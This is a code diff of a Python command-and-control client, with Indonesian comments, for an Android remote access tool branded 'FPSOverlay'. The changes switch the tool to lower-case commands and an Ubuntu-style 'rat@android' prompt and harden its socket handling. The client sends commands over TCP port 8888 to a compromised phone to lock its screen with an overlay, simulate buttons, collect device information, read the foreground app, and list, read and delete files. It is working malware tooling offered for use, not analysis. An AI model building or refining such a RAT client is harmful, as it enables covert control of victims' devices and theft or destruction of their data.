@@ -5,7 +5,8 @@ import subprocess
 
 # Auto-install dependencies function
 def install_dependencies():
-    required_packages = [] # Tambahkan di sini jika nanti butuh library eksternal seperti 'requests' atau 'colorama'
+    # Tambahkan library jika diperlukan
+    required_packages = []
     for package in required_packages:
         try:
             __import__(package)
@@ -18,14 +19,17 @@ def send_command(ip, port, cmd):
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
             s.settimeout(10)
             s.connect((ip, port))
+            # Tambahkan newline agar readLine() di Java terbaca
             s.sendall((cmd + "\n").encode())
 
-            # Mendukung response yang panjang (seperti LS)
             data = b""
             while True:
-                part = s.recv(4096)
-                data += part
-                if len(part) < 4096:
+                try:
+                    part = s.recv(4096)
+                    if not part: break
+                    data += part
+                    if len(part) < 4096: break
+                except socket.timeout:
                     break
             return data.decode().strip()
     except Exception as e:
@@ -41,7 +45,7 @@ def print_banner():
     (_/\_)(__)  (__\_)  \___) \__/ \_)__)(____/\__/ \____/(____)
     \033[0m
     [+] FPSOverlay Advanced Remote Access Tool
-    [+] Mode: Meterpreter-Style Shell
+    [+] Mode: Ubuntu-Style Shell (Lower Case Supported)
     """)
 
 def main():
@@ -53,64 +57,71 @@ def main():
         target_ip = sys.argv[1]
 
     print_banner()
-    current_dir = send_command(target_ip, 8888, "PWD")
+    # Inisialisasi direktori
+    current_dir = send_command(target_ip, 8888, "pwd")
 
     while True:
         try:
-            # Pastikan current_dir tidak error
-            if "Error" in str(current_dir):
-                print(f"\033[91m[!]\033[0m Connection failed: {current_dir}")
-                target_ip = input("\033[92m[?]\033[0m Enter New Target IP (or EXIT): ")
-                if target_ip.upper() == "EXIT": break
-                current_dir = send_command(target_ip, 8888, "PWD")
+            if not current_dir or "Error" in str(current_dir):
+                print(f"\033[91m[!]\033[0m Connection lost or IP unreachable.")
+                target_ip = input("\033[92m[?]\033[0m Re-enter Target IP (or 'exit'): ")
+                if target_ip.lower() == "exit": break
+                current_dir = send_command(target_ip, 8888, "pwd")
                 continue
 
-            prompt = f"\033[94mrat\033[0m:\033[91m{current_dir}\033[0m > "
+            # Prompt ala Ubuntu: user@device:path$
+            prompt = f"\033[92mrat@android\033[0m:\033[94m{current_dir}\033[0m$ "
             cmd_input = input(prompt).strip()
 
             if not cmd_input:
                 continue
 
-            cmd_upper = cmd_input.upper()
+            cmd_lower = cmd_input.lower()
 
-            if cmd_upper == "HELP":
+            if cmd_lower == "help":
                 print("""
                 Core Commands
                 =============
-                LOCK/UNLOCK    Toggle screen overlay
-                VIBRATE        Device vibration
-                HOME/BACK      Simulate hardware buttons
-                INFO           Get device hardware info
-                SCREEN         Get foreground app
-                MESSAGE <text> Show Toast message
+                lock/unlock    Toggle screen overlay
+                vibrate        Device vibration
+                home/back      Simulate hardware buttons
+                info           Get device hardware info
+                screen         Get foreground app
+                message <text> Show Toast message
 
-                File System Commands
+                File System Commands (Ubuntu-Style)
                 ====================
-                LS             List files in current directory
-                CD <dir>       Change directory
-                PWD            Print current path
-                CAT <file>     Read file content
-                RM <file>      Delete file
+                ls             List files
+                cd <dir>       Change directory
+                pwd            Print current path
+                cat <file>     Read file content
+                rm <file>      Delete file
 
                 System Commands
                 ===============
-                CLEAR          Clear terminal screen
-                EXIT           Terminate session
+                clear          Clear terminal screen
+                exit           Terminate session
                 """)
-            elif cmd_upper == "CLEAR":
+            elif cmd_lower == "clear":
                 os.system('clear' if os.name == 'posix' else 'cls')
-            elif cmd_upper == "EXIT":
+            elif cmd_lower == "exit":
+                print("[*] Closing session...")
                 break
-            elif cmd_upper.startswith("CD "):
+            elif cmd_lower.startswith("cd "):
                 res = send_command(target_ip, 8888, cmd_input)
-                print(res)
-                current_dir = send_command(target_ip, 8888, "PWD")
+                if "ERROR" in res:
+                    print(f"\033[91m{res}\033[0m")
+                # Update current_dir setelah pindah folder
+                current_dir = send_command(target_ip, 8888, "pwd")
             else:
                 res = send_command(target_ip, 8888, cmd_input)
                 print(res)
 
         except KeyboardInterrupt:
-            print("\n[*] Session closed.")
+            print("\n[*] Logout.")
+            break
+        except Exception as e:
+            print(f"[*] Unexpected error: {e}")
             break
 
 if __name__ == "__main__":
